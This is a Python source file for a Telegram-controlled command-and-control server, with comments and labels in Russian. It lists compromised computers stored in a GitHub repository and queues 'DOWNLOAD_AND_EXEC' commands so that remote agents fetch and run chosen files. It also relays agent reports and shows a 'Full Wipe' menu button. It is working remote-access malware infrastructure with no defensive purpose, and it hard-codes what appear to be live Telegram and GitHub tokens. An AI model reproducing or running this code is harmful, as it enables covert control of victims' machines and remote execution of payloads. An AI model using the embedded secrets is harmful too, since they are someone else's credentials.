import os
import base64
import requests
import telebot
from flask import Flask, request, jsonify

TOKEN = "9213726416:AAHSKz3sdyxo05XS-yX0dH_1h6FGg7PKA_k"
bot = telebot.TeleBot(TOKEN, threaded=False)

app = Flask(__name__)

GITHUB_TOKEN = "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"
GITHUB_REPO = "mam4939/agent-db"

selected_computer = None
pending_command = {}

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_data = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_data)
        bot.process_new_updates([update])
        return "", 200
    return "Forbidden", 403

@app.route("/api/get_command", methods=["GET"])
def get_command():
    pc_name = request.args.get("pc", "")
    cmd = pending_command.get(pc_name, "")
    if pc_name in pending_command:
        pending_command[pc_name] = ""
    return jsonify({"command": cmd}), 200

@app.route("/api/report", methods=["POST"])
def report():
    data = request.json
    if data and "message" in data:
        chat_id = data.get("chat_id", "8172067310")
        bot.send_message(chat_id, f"Отчет:\n{data['message']}")
    return "OK", 200

@app.route("/", methods=["GET"])
def index():
    return "Server is running", 200

@bot.message_handler(commands=['start'])
def start_cmd(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("Список компьютеров", "Запустить")
    markup.row("Полный Wipe")
    bot.send_message(message.chat.id, "Панель управления.", reply_markup=markup)

@bot.message_handler(func=lambda msg: msg.text == "Список компьютеров")
def list_computers(message):
    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/computers"
    
    try:
        res = requests.get(url, headers=headers)
        if res.status_code == 200:
            items = res.json()
            markup = telebot.types.InlineKeyboardMarkup()
            count = 0
            for item in items:
                if item["type"] == "dir":
                    pc_name = item["name"]
                    markup.add(telebot.types.InlineKeyboardButton(f"ПК: {pc_name}", callback_data=f"select_pc:{pc_name}"))
                    count += 1
            
            if count == 0:
                bot.send_message(message.chat.id, "Папка computers пуста. Агент еще не передал данные.")
                return
                
            markup.add(telebot.types.InlineKeyboardButton("Назад", callback_data="menu_main"))
            bot.send_message(message.chat.id, "Выберите компьютер из списка:", reply_markup=markup)
        elif res.status_code == 404:
            bot.send_message(message.chat.id, "Папка computers еще не создана на GitHub. Запустите агент.")
        else:
            bot.send_message(message.chat.id, f"Ошибка GitHub API: {res.status_code}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@bot.message_handler(func=lambda msg: msg.text == "Запустить")
def github_explorer(message):
    global selected_computer
    if not selected_computer:
        bot.send_message(message.chat.id, "Сначала выберите компьютер в разделе 'Список компьютеров'.")
        return
    fetch_github_path(message.chat.id, "")

def fetch_github_path(chat_id, path):
    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{path}"
    
    try:
        res = requests.get(url, headers=headers)
        if res.status_code == 200:
            items = res.json()
            markup = telebot.types.InlineKeyboardMarkup()
            for item in items:
                if item["name"] == "computers":
                    continue
                if item["type"] == "dir":
                    markup.add(telebot.types.InlineKeyboardButton(f"[Папка] {item['name']}", callback_data=f"gh_dir:{item['path']}"))
                elif item["type"] == "file":
                    markup.add(telebot.types.InlineKeyboardButton(f"[Файл] {item['name']}", callback_data=f"gh_exec:{item['download_url']}"))
            
            if path:
                parent_path = os.path.dirname(path)
                markup.add(telebot.types.InlineKeyboardButton("Назад", callback_data=f"gh_dir:{parent_path if parent_path else ''}"))
            else:
                markup.add(telebot.types.InlineKeyboardButton("Назад", callback_data="menu_main"))
                
            bot.send_message(chat_id, f"Репозиторий ({path if path else 'корень'}):", reply_markup=markup)
    except Exception as e:
        bot.send_message(chat_id, f"Ошибка доступа: {str(e)}")

@bot.callback_query_handler(func=lambda call: True)
def callbacks(call):
    global selected_computer, pending_command
    data = call.data
    
    if data.startswith("select_pc:"):
        selected_computer = data.split(":")[1]
        bot.answer_callback_query(call.id, f"Выбран ПК: {selected_computer}")
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"Активный компьютер: {selected_computer}")
        
    elif data.startswith("gh_dir:"):
        path = data.split(":")[1]
        fetch_github_path(call.message.chat.id, path if path != "." else "")
        
    elif data.startswith("gh_exec:"):
        file_url = data.split(":", 1)[1]
        if not selected_computer:
            bot.answer_callback_query(call.id, "Компьютер не выбран")
            return
        pending_command[selected_computer] = f"DOWNLOAD_AND_EXEC:{file_url}"
        bot.answer_callback_query(call.id, "Команда отправлена")
        bot.send_message(call.message.chat.id, f"Команда на запуск отправлена на ПК: {selected_computer}")
        
    elif data == "menu_main":
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="Главное меню.")

if __name__ == "__main__":
    HOST_URL = "https://tg-bot-bekv.onrender.com"
    bot.remove_webhook()
    bot.set_webhook(url=f"{HOST_URL}/{TOKEN}")
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
